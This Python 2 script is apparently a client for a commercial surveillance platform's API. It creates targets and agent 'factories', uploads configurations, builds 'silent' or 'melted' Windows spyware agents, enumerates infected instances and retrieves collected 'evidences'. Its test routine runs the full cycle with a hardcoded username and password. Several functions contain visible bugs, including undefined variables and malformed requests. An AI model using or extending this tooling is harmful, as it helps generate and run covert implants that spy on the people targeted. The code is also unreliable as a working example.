import urllib,urllib2
from urllib2 import HTTPError
import cookielib
import json
import subprocess,os


class API:

    def __init__(self, host, user, passwd):
        self.host = host
        self.user = user
        self.passwd = passwd
        #self.cookie = self.do_login()
        
    def get_response(self, link, cookies = None):
        """ Basic HTTP Request/Response with Cookie
        @param link
        @param cookie
        @returns response page
        """
        try:
            req = urllib2.Request(link)
            if cookies:
                opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookies))
            resp = opener.open(req).read()
            
            return resp
        except HTTPError as e:
            print "Error processing %s: %s" % (link, e)
            
    def post_response(self, link, cj, data=None):
        """ Basic POST Request / Response
        @param link
        @param data
        @param cookie
        @returns response page
        """
        try:
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj), 
                    urllib2.HTTPHandler() )
            req = urllib2.Request(link, data)
            resp = opener.open(req).read()
            return resp
        except HTTPError as e:
            print "Error processing %s: %s" % (link, e)

    def call(self, api_name, data={}, binary=False):
        
        link = 'https://%s/%s' % (self.host, api_name)
        resp = self.post_response(link, self.cookie, json.dumps(data))
        if binary:
            return resp 

        try:            
            result = json.loads(resp)
            return result
        except Exception, e:
            print e
            print "error: ",resp
            raise e
       

    def call_get(self, api_name):
        link = 'https://%s/%s' % (self.host, api_name)
        resp = self.get_response(link, self.cookie)
        result = json.loads(resp)
        return result
        
    def login(self):
        """ Do Login request to catch cookie
        @param link: url to login page
        @param data: post data
        @returns cookie 
        """
        login = { 'user':self.user,
                  'pass':self.passwd }
        
        link = "https://%s/auth/login" % self.host
        data = json.dumps(login)
        cj = cookielib.CookieJar()
        resp = self.post_response(link, cj, data)
        '''
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj), 
                urllib2.HTTPHandler() )
        req = urllib2.Request(link)
        resp = opener.open(req)
        '''
        self.cookie = cj
        return cj

        
    def logout(self):
        """ Logout for session
        @param session cookie
        @return True/False
        """
        self.call('auth/logout')
        return True

    def operation(self, operation):
        operations = self.call_get('operation')
        ret = [ op['_id'] for op in operations if op['name'] == operation ]
        return ret[0] if ret else None

    #def targets(self, target):
    #    operations = self.call_get('target')
    #    print operations
    #    ret = [ op['_id'] for op in operations if op['name'] == target ]
    #    return ret

    def targets(self, operation, target):
        operations = self.call_get('target')
        ret = [ op['_id'] for op in operations if op['name'] == target and op['path'] == operation ]
        return ret

    def target_delete(self, target_id):
        """ Delete a given target """
        return self.call('target/destroy', {'_id': target_id })

    def target_create(self, operation_id, name, desc):
        """ Create a given target """
        data = {'name': name, 'desc': desc, 'operation': operation_id }
        target =  self.call('target/create', data)
        return target['_id']

    def factory_create(self, operation_id, target_id, ftype, name, desc):
        """ Create a factory """
        data = {'name': name, 'desc': desc, 'operation': operation_id, 'target': target_id, 'type': ftype }
        factory = self.call('agent/create', data)
        return factory['_id']

    def factory_add_config(self, factory_id, config):
        data = {'_id': factory_id, 'config': config }
        return self.call('agent/add_config', data)

    def update_conf(self, conf_file, factory):
        """ Update sync configuration
        @param configuration file
        @param factory id
        @return True/False
        """
        try:
            base = 'https://%s' % self.host
            
            faclink = '%s/factory' % base
            resp = self.get_response(faclink, self.cookie)
            facts = json.loads(resp)
            for fact in facts:
                if fact["ident"] == factory:
                    fct = fact
                    break
            if not fct:
                return False
            #print fct
            addlink = '%s/agent/add_config' % base
            f = open(conf_file, 'r')
            cnf = f.read()
            data = {'_id':fct["_id"], 'config':cnf }
            #print data
            resp = self.post_response(addlink, self.cookie, json.dumps(data))

            return True
        except Exception as e:
            print e
            return False
    
    
    def target(self, target_name):
        
        baselink = "https://%s/target" % self.host
        targets = self.get_response(baselink, self.cookie)
        
        t = json.loads(targets)

        #[ s['id'] for s in t if s['name'] == target_name][0]
        for s in t:
            if s['name'] == target_name:
                return s['_id']
        return None
        
#   def enum_instances(self, device, factory, timeout):
    def enum_instances(self, factory):
        """ Enumerate all instances for given factory
        @param factory
        @return dict of instances
        """

        ins = {}
        baselink = 'https://%s/agent' % self.host
        resp = self.get_response(baselink, self.cookie)
        agents = json.loads(resp)

        [  ]
        for agent in agents:
            
            if agent["ident"] == factory and agent["_kind"] == "agent":
                link = '%s/%s' % (baselink, agent["_id"])
                resp = self.get_response(link, self.cookie)
                dev = json.loads(resp)
                ins[device] = dev

                return (agent["ident"],agent['_id'])

    def delete_instance(self, instance):
        """ Delete a given instance
        @param instance
        """
        data = {'_id': instance, 'permanent':True }
        link = 'https://%s/agent/destroy'
        resp = self.post_response(link, self.cookie, json.dumps(data))
        
        print resp
        

    def get_evidences(self, target, agent, type):
        """ Get evidences of given agent and target
        @param target
        @param agent
        @param type (if None all types should be returned)
        """
        f = { "type":"['']", "target":target, "agent":agent[1] }
        filter = json.dumps(f)
        print urllib.quote(filter)
        link  = 'https://%s/evidence?filter=%s' % (self.host, filter)
        resp  = self.get_response(link, self.cookie)
        
        print resp
    
    
    def config(self, factory_id, param_file):
        '''
        jcontent = File.open(param_file, 'r') {|f| f.read}

        resp = @http.request_post("/agent/add_config", {_id: @factory['_id'], config: jcontent}.to_json, {'Cookie' => @cookie})
        resp.kind_of? Net::HTTPSuccess or raise(resp.body)

        puts "Configuration saved"
        '''     
        jcontent = open(param_file, 'r').read()
        link  = 'https://%s/agent/add_config' % (self.host, filter)
        data = '{"_id":"%s", "config":"%s"}' % (factory_id, jcontent)
        resp = self.post_response(link, json.dumps(data))
        
        print "[*] Conf saved"
    
    def build(self, factory, params, out_file):
        """ Build Silent or Melted Exe 
        @param param_file 
        @param factory
        @param out_file
        """

        params['factory'] = { "_id": "%s" % factory } 
        print "[*] Build params: \n%s" % json.dumps(params)
        #link  = 'https://%s/build' % self.host
        #resp = self.post_response(link, json.dumps(params))
        resp = self.call('build', params, True)
        
        out = open(out_file, 'wb')
        out.write(resp)
        
        print "[*] bytes saved to %s" % out_file


def test():
    print 'test'
    host = "rcs-castore"
    user = "avmonitor"
    passwd = "avmonitorp1234"
    conn = API(host, user, passwd)
    print conn.login()
 
    if(False):
        operation, target, factory = '511dfd70aef1de05f8001090', '511e44d4aef1de05f800137a', '511e44d5aef1de05f8001380'
 
    else:
        operation = conn.operation('AVMonitor')
        target = conn.target_create(operation,'Turca','la mia targa')
        factory = conn.factory_create(operation, target, 'desktop', 'fattoria', 'degli animali')
        print "factory: ", factory
        #sleep(10)
 
        config = open('config.json').read()
        conn.factory_add_config(factory, config)
 
    param = { 'platform': 'windows',
          'binary': { 'demo' : False, 'admin' : False},
          'melt' : {'scout' : True, 'admin' : False, 'bit64' : True, 'codec' : True },
          'sign' : {}
          }
 
    #{"admin"=>false, "bit64"=>true, "codec"=>true, "scout"=>true}
    try:
        r = conn.build(factory, param, 'build.out')
    except Exception, e:
        print e
    
    r = unzip('build.out')
    print r
 
    r = conn.enum_instances( factory )
    print r
 
    #sleep(5)
    conn.target_delete(target)
    print operation, target, factory
    print conn.logout()
if __name__ == "__main__":
    test()
